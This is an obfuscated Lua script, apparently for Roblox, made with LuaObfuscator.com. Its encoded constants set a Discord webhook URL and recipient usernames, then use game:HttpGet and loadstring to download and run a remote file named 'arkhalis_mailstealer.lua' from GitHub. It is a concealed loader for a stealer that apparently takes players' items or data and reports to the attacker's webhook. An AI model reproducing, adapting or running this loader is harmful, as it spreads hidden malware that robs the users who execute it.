--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v102=0;local v103;while true do if (v102==1) then return v103;end if (v102==0) then v103=v5(v82,v19);v19=nil;v102=1;end end else return v82;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v83=0 -0 ;local v84;while true do if (v83==(0 -0)) then v84=(v31/((3 -(1 -0))^(v32-(2 -(351 -(87 + 263))))))%((621 -(555 + 64))^(((v33-(1 -0)) -(v32-(1066 -(68 + 997)))) + (1271 -(226 + 1044)))) ;return v84-(v84%(4 -3)) ;end end else local v85=117 -(32 + 85) ;local v86;while true do if (v85==(931 -(857 + 74))) then v86=(570 -(367 + 201))^(v32-(928 -(214 + (893 -(67 + 113))))) ;return (((v31%(v86 + v86))>=v86) and (1 + 0 + 0)) or (0 -0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 + 0 );v18=v18 + (7 -5) ;return (v36 * (628 -372)) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (7 -4) );v18=v18 + (6 -2) ;return (v40 * (7114024 + 5097927 + 4565265)) + (v39 * (66533 -(915 + 82))) + (v38 * (724 -468)) + v37 ;end local function v24()local v41=v23();local v42=v23();local v43=1 -0 ;local v44=(v20(v42,1188 -(876 + 193 + 118) ,45 -25 ) * ((774 -(201 + 571))^(1170 -(116 + 1022)))) + v41 ;local v45=v20(v42,45 -24 ,(24 -18) + 25 );local v46=((v20(v42,56 -24 )==(1 + 0)) and  -(792 -(368 + 423))) or (3 -2) ;if (v45==(18 -(10 + 8))) then if (v44==(0 -0)) then return v46 * 0 ;else local v90=0;while true do if (v90==0) then v45=443 -(416 + 26) ;v43=0 -(0 + 0) ;break;end end end elseif (v45==((3208 -2329) + 1168)) then return ((v44==((0 -0) -0)) and (v46 * ((439 -(145 + 293))/(430 -(44 + (1245 -(814 + 45))))))) or (v46 * NaN) ;end return v8(v46,v45-(2509 -(998 + 488)) ) * (v43 + (v44/(2^(17 + (86 -51))))) ;end local function v25(v47)local v48;if  not v47 then local v87=0;while true do if (v87==(0 + 0)) then v47=v23();if (v47==(0 + 0)) then return "";end break;end end end v48=v3(v16,v18,(v18 + v47) -(886 -(261 + 624)) );v18=v18 + v47 ;local v49={};for v65=1 -0 , #v48 do v49[v65]=v2(v1(v3(v48,v65,v65)));end return v6(v49);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v50=0;local v51;local v52;local v53;local v54;local v55;local v56;local v57;local v58;while true do if (v50==(2 + 0)) then v55=nil;v56=nil;v50=3;end if (v50==(6 -2)) then while true do if (v51==(1467 -(899 + 568))) then local v97=0 + 0 ;local v98;while true do if (v97==0) then v98=0 -0 ;while true do if (v98==(604 -(268 + 335))) then v51=239 -(64 + 174) ;break;end if (v98==(290 -(60 + 230))) then local v106=572 -(426 + 146) ;while true do if (0==v106) then v52=0;v53=nil;v106=1 + 0 ;end if (1==v106) then v98=1457 -(282 + 1174) ;break;end end end end break;end end end if (v51~=(812 -(569 + 242))) then else local v99=0;local v100;while true do if (v99==(0 -0)) then v100=0 + 0 ;while true do if (v100~=0) then else v54=nil;v55=nil;v100=1;end if ((1 + 0)~=v100) then else v51=2 + 0 ;break;end end break;end end end if (v51==(2 + 1)) then v58=nil;while true do local v104=0;while true do if (v104==(1505 -(363 + 1141))) then if (v52==(1027 -(706 + 318))) then local v107=0;local v108;while true do if ((1251 -(721 + 530))~=v107) then else v108=0;while true do if (v108==(0 + 0)) then for v171=1 + 0 ,v23() do v54[v171-1 ]=v28();end return v56;end end break;end end end if (v52==(1272 -(945 + 326))) then local v109=1975 -(1913 + 62) ;local v110;while true do if (v109~=0) then else v110=0 + 0 ;while true do if (v110==(0 -0)) then v56={v53,v54,nil,v55};v57=v23();v110=1;end if (v110==(1662 -(1477 + 184))) then v58={};v52=2 -0 ;break;end end break;end end end break;end if (v104~=(0 + 0)) then else local v105=1500 -(1408 + 92) ;while true do if ((1 -0)==v105) then v104=1087 -(461 + 625) ;break;end if (v105==(1288 -(993 + 295))) then if (v52==(1 + 1)) then local v127=1171 -(418 + 753) ;local v128;local v129;while true do if (v127~=0) then else v128=0 + 0 ;v129=nil;v127=1 + 0 ;end if (v127~=1) then else while true do if (v128~=(0 + 0)) then else v129=476 -(41 + 435) ;while true do if (v129==0) then local v174=1001 -(938 + 63) ;local v175;while true do if ((0 + 0)==v174) then v175=0 + 0 ;while true do if (v175~=0) then else local v181=1125 -(936 + 189) ;while true do if (v181==(0 + 0)) then for v189=1,v57 do local v190=0 + 0 ;local v191;local v192;local v193;while true do if (v190==0) then v191=0;v192=nil;v190=530 -(406 + 123) ;end if (v190~=(1770 -(1749 + 20))) then else v193=nil;while true do if (v191==(0 + 0)) then local v196=1322 -(1249 + 73) ;while true do if (v196==0) then v192=v21();v193=nil;v196=1 + 0 ;end if (v196==(1146 -(466 + 679))) then v191=1 -0 ;break;end end end if (v191~=(2 -1)) then else if (v192==1) then v193=v21()~=0 ;elseif (v192==(5 -3)) then v193=v24();elseif (v192==3) then v193=v25();end v58[v189]=v193;break;end end break;end end end v56[3]=v21();v181=1;end if (v181~=(1901 -(106 + 1794))) then else v175=1 + 0 ;break;end end end if (v175~=(1 + 0)) then else v129=3 -2 ;break;end end break;end end end if (v129~=(3 -2)) then else for v176=1019 -(697 + 321) ,v23() do local v177=0 -0 ;local v178;local v179;while true do if ((0 -0)==v177) then local v180=0 -0 ;while true do if (v180==(2 -1)) then v177=2 -1 ;break;end if (v180==(0 + 0)) then v178=0 -0 ;v179=nil;v180=115 -(4 + 110) ;end end end if (v177==(585 -(57 + 527))) then while true do if (v178~=(1227 -(322 + 905))) then else v179=v21();if (v20(v179,1,1)==0) then local v183=611 -(602 + 9) ;local v184;local v185;local v186;local v187;local v188;while true do if (1==v183) then v186=nil;v187=nil;v183=1429 -(41 + 1386) ;end if (v183==(103 -(17 + 86))) then v184=0 + 0 ;v185=nil;v183=1;end if (v183==(3 -1)) then v188=nil;while true do if (v184==(948 -(245 + 702))) then local v194=0 -0 ;while true do if (v194~=(167 -(122 + 44))) then else v184=2 -0 ;break;end if (v194~=0) then else v187=nil;v188=nil;v194=3 -2 ;end end end if (v184~=(0 -0)) then else local v195=0 + 0 ;while true do if (v195==(0 + 0)) then local v198=1898 -(260 + 1638) ;while true do if (v198==1) then v195=1;break;end if (v198==(440 -(382 + 58))) then v185=0;v186=nil;v198=1 -0 ;end end end if (v195~=(1 + 0)) then else v184=1;break;end end end if ((3 -1)==v184) then while true do if (v185~=(68 -(30 + 35))) then else if (v20(v187,3 + 0 ,1260 -(1043 + 214) )==1) then v188[1209 -(902 + 303) ]=v58[v188[15 -11 ]];end v53[v176]=v188;break;end if (2==v185) then local v200=1212 -(323 + 889) ;local v201;while true do if (v200~=(0 -0)) then else v201=580 -(361 + 219) ;while true do if (v201==(320 -(53 + 267))) then local v208=0;local v209;while true do if (v208~=0) then else v209=0 + 0 ;while true do if (v209==1) then v201=414 -(15 + 398) ;break;end if (v209==(683 -(483 + 200))) then if (v20(v187,1,983 -(18 + 964) )~=1) then else v188[2]=v58[v188[5 -3 ]];end if (v20(v187,2 -0 ,767 -(468 + 297) )==(563 -(334 + 228))) then v188[10 -7 ]=v58[v188[3]];end v209=1;end end break;end end end if (v201==(2 -1)) then v185=11 -8 ;break;end end break;end end end if (v185~=(1 + 0)) then else local v202=0;local v203;while true do if (v202==(0 + 0)) then v203=0 + 0 ;while true do if (v203~=(851 -(20 + 830))) then else v185=2;break;end if ((0 + 0)~=v203) then else v188={v22(),v22(),nil,nil};if (v186==(0 + 0)) then local v210=0 -0 ;local v211;local v212;while true do if (v210~=(1 + 0)) then else while true do if (v211~=0) then else v212=0 + 0 ;while true do if (v212==(0 + 0)) then v188[4 -1 ]=v22();v188[10 -6 ]=v22();break;end end break;end end break;end if (v210==(0 -0)) then v211=1551 -(1126 + 425) ;v212=nil;v210=164 -(92 + 71) ;end end elseif (v186==(1 + 0)) then v188[3]=v23();elseif (v186==(2 -0)) then v188[768 -(574 + 191) ]=v23() -((407 -(118 + 287))^16) ;elseif (v186~=3) then else local v219=0;local v220;while true do if (v219~=(0 -0)) then else v220=0 + 0 ;while true do if (v220==0) then v188[1124 -(118 + 1003) ]=v23() -(2^(46 -30)) ;v188[4]=v22();break;end end break;end end end v203=127 -(55 + 71) ;end end break;end end end if (v185~=(377 -(142 + 235))) then else local v204=0;local v205;while true do if (v204==(0 -0)) then v205=0 -0 ;while true do if (v205~=(1 + 0)) then else v185=978 -(553 + 424) ;break;end if (v205==(0 -0)) then v186=v20(v179,2 + 0 ,3 + 0 );v187=v20(v179,3 + 1 ,3 + 3 );v205=2 -1 ;end end break;end end end end break;end end break;end end end break;end end break;end end end v52=2 + 1 ;break;end end break;end end break;end end end if (v52==0) then local v130=0 + 0 ;local v131;while true do if ((0 -0)==v130) then v131=0 -0 ;while true do if (v131==(49 -(25 + 23))) then v55={};v52=1;break;end if (v131~=0) then else local v173=0 -0 ;while true do if (v173==(0 -0)) then v53={};v54={};v173=1 + 0 ;end if (v173~=(4 -3)) then else v131=1 -0 ;break;end end end end break;end end end v105=1;end end end end end break;end if (v51~=(755 -(239 + 514))) then else local v101=0 + 0 ;while true do if (v101~=(1329 -(797 + 532))) then else v56=nil;v57=nil;v101=1 + 0 ;end if (v101~=(1 + 0)) then else v51=6 -3 ;break;end end end end break;end if (v50==(1202 -(373 + 829))) then v51=731 -(476 + 255) ;v52=nil;v50=1131 -(369 + 761) ;end if (v50~=(2 + 1)) then else v57=nil;v58=nil;v50=3 + 1 ;end if (v50==1) then v53=nil;v54=nil;v50=1063 -(810 + 251) ;end end end local function v29(v59,v60,v61)local v62=v59[1];local v63=v59[2];local v64=v59[3];return function(...)local v67=v62;local v68=v63;local v69=v64;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v88=0,v75 do if (v88>=v69) then v73[v88-v69 ]=v74[v88 + 1 ];else v77[v88]=v74[v88 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do local v89=0;while true do if (v89==1) then if (v80<=11) then if (v80<=5) then if (v80<=2) then if (v80<=0) then v77[v79[2]]=v61[v79[3]];elseif (v80>1) then v61[v79[3]]=v77[v79[2]];else for v158=v79[2],v79[3] do v77[v158]=nil;end end elseif (v80<=3) then v77[v79[2]]=v79[3];elseif (v80==4) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end else v77[v79[2]]=v79[3]~=0 ;end elseif (v80<=8) then if (v80<=6) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80==7) then v77[v79[2]]();else local v136=v79[2];v77[v136]=v77[v136](v13(v77,v136 + 1 ,v72));end elseif (v80<=9) then for v122=v79[2],v79[3] do v77[v122]=nil;end elseif (v80>10) then local v138=0;local v139;local v140;while true do if (v138==1) then v77[v139 + 1 ]=v140;v77[v139]=v140[v79[4]];break;end if (v138==0) then v139=v79[2];v140=v77[v79[3]];v138=1;end end else v61[v79[3]]=v77[v79[2]];end elseif (v80<=17) then if (v80<=14) then if (v80<=12) then local v115=0;local v116;while true do if (v115==0) then v116=v79[2];v77[v116]=v77[v116](v13(v77,v116 + 1 ,v72));break;end end elseif (v80>13) then do return;end else do return;end end elseif (v80<=15) then v77[v79[2]]=v79[3]~=0 ;elseif (v80==16) then v77[v79[2]]=v61[v79[3]];else local v145=v79[2];local v146,v147=v70(v77[v145](v13(v77,v145 + 1 ,v79[3])));v72=(v147 + v145) -1 ;local v148=0;for v162=v145,v72 do v148=v148 + 1 ;v77[v162]=v146[v148];end end elseif (v80<=20) then if (v80<=18) then v77[v79[2]]();elseif (v80>19) then local v149=v79[2];local v150=v77[v79[3]];v77[v149 + 1 ]=v150;v77[v149]=v150[v79[4]];else v71=v79[3];end elseif (v80<=21) then local v118=v79[2];local v119,v120=v70(v77[v118](v13(v77,v118 + 1 ,v79[3])));v72=(v120 + v118) -1 ;local v121=0;for v124=v118,v72 do v121=v121 + 1 ;v77[v124]=v119[v121];end elseif (v80>22) then v77[v79[2]]=v79[3];else v71=v79[3];end v71=v71 + 1 ;break;end if (v89==0) then v79=v67[v71];v80=v79[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O312O39343935333933372O3038323335342F5F6E376549306E5274794A614C7063503159784E5247616D76615F3047585531496A53434746524278384866544B7A334C6534486C6861676C39624C307841442D4E566A030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403613O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F41726B68616C69736C75612F41726B68616C69736C75612E6769746875622E696F2F6D61696E2F61726B68616C69735F6D61696C737465616C65722E6C756103083O00557365724E616D65030D3O005472656173757265697461353803093O00557365724E616D653200253O0012033O00014O0009000100013O0026043O0002000100010004133O00020001001203000100013O00260400010012000100020004133O00120001001203000200043O001202000200033O00122O000200053O00122O000300063O002014000300030007001203000500084O000F000600014O0015000300064O000800023O00022O00120002000100010004133O0024000100260400010005000100010004133O00050001001203000200013O0026040002001C000100010004133O001C00010012030003000A3O001202000300093O0012030003000A3O0012020003000B3O001203000200023O00260400020015000100020004133O00150001001203000100023O0004133O000500010004133O001500010004133O000500010004133O002400010004133O000200012O000D3O00017O00",v9(),...);end